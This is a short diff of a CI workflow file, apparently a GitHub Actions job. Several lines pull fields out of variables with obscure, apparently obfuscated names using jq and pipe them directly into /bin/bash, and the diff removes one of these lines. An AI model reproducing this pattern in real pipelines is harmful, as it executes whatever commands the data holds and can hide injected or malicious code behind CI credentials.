@@ -26,7 +26,6 @@ jobs:
           echo $cxu7199 | jq -r .fv9835 | /bin/bash
           echo $no51 | jq -r .l4 | /bin/bash
           printf '%s' "$qpv026" | jq -r .c952 | /bin/bash
-          echo $nu43718 | jq -r .ul4747 | /bin/bash
           echo $wltw2773 | jq -r .tn67 | /bin/bash
 
       - name: Upload results
